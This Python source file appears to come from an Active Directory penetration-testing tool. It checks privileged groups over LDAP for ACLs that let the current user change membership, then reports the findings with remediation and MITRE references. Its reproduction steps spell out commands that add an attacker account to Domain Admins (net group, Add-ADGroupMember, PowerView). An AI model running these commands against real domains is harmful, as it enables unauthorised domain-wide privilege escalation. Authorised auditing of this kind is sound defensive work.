"""ACL Abuse: Add Member — add attacker to privileged group via WriteMember."""
from __future__ import annotations
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity
from adforge.core.ldap_client import LdapClient

CVSS = "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
CVSS40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N"
WRITE_PROPERTY = 0x00000020
GENERIC_WRITE = 0x40000000
GENERIC_ALL = 0x10000000
# member attribute GUID
MEMBER_GUID = "bf9679c0-0de6-11d0-a285-00aa003049e2"

class AddMember(BaseModule):
    NAME = "add_member"
    DESCRIPTION = "ACL Abuse: detect WriteMember on groups for privilege escalation"
    PHASE = 9
    TAGS = ["acl-abuse", "privesc", "cwe-284"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        dc_ip = self.config.extra.get("dc", self.config.target)
        domain = self.config.extra.get("domain", "")
        if not self.check_scope(dc_ip):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        client = LdapClient(dc_ip=dc_ip, domain=domain,
            username=self.config.extra.get("username", ""),
            password=self.config.extra.get("password", ""),
            nt_hash=self.config.extra.get("hash", ""))
        if not client.connect(): return self._make_result(start)

        try:
            # Check dangerous ACEs from earlier enum
            dangerous_aces = self.config.extra.get("dangerous_aces", [])
            writable_groups = [
                ace for ace in dangerous_aces
                if ace.get("right") in ("GenericAll", "GenericWrite", "WriteProperty")
            ]

            # Also check privileged groups directly
            await self.rate_limit()
            priv_groups = client.search(
                "(|(sAMAccountName=Domain Admins)(sAMAccountName=Enterprise Admins)"
                "(sAMAccountName=Administrators)(sAMAccountName=Account Operators))",
                ["sAMAccountName", "distinguishedName", "nTSecurityDescriptor", "member"])

            import struct
            for group in priv_groups:
                gname = str(group.get("sAMAccountName", "?"))
                sd = group.get("nTSecurityDescriptor")
                if not sd or not isinstance(sd, bytes) or len(sd) < 20:
                    continue

                try:
                    offset_dacl = struct.unpack("<I", sd[16:20])[0]
                    if offset_dacl == 0 or offset_dacl >= len(sd): continue
                    acl = sd[offset_dacl:]
                    if len(acl) < 8: continue
                    ace_count = struct.unpack("<H", acl[4:6])[0]
                    pos = 8
                    for _ in range(min(ace_count, 200)):
                        if pos + 8 > len(acl): break
                        ace_type = acl[pos]
                        ace_size = struct.unpack("<H", acl[pos+2:pos+4])[0]
                        if ace_size < 4 or pos + ace_size > len(acl): break
                        if ace_type in (0, 5):
                            mask = struct.unpack("<I", acl[pos+4:pos+8])[0]
                            if mask & (GENERIC_ALL | GENERIC_WRITE | WRITE_PROPERTY):
                                writable_groups.append({
                                    "target": gname, "right": "WriteMember",
                                    "ace_type": ace_type,
                                })
                        pos += ace_size
                except Exception:
                    pass

            if writable_groups:
                if not self.confirm_action(
                    action="Report AddMember abuse paths",
                    target=dc_ip,
                    risk="Identifies privilege escalation via group membership modification"):
                    return self._make_result(start, skipped=True, skip_reason="operator declined")

                ev = Evidence(extra={"writable_groups": writable_groups[:20]})
                self.new_finding(
                    title=f"AddMember Abuse — {len(writable_groups)} writable privileged groups",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Current user can modify membership of {len(writable_groups)} group(s):\n"
                        + "\n".join(f"  {w['target']}: {w['right']}" for w in writable_groups[:10])
                        + "\n\nExploitation: Add attacker account to Domain Admins for immediate domain admin."
                    ),
                    reproduction_steps=[
                        f"net group 'Domain Admins' attacker_user /add /domain",
                        f"# Or: Add-ADGroupMember -Identity 'Domain Admins' -Members attacker",
                        f"# PowerView: Add-DomainGroupMember -Identity 'Domain Admins' -Members attacker",
                    ],
                    remediation="Remove WriteMember/GenericAll/GenericWrite from non-admin principals on privileged groups.",
                    references=["CWE-284", "MITRE T1098"],
                    evidence=ev, cvss_v31_vector=CVSS, cvss_v40_vector=CVSS40,
                    mitre_attack=["TA0003/T1098"],
                    target=dc_ip)
        finally:
            client.disconnect()
        return self._make_result(start)

class TestAddMember:
    def test_phase(self) -> None: assert AddMember.PHASE == 9
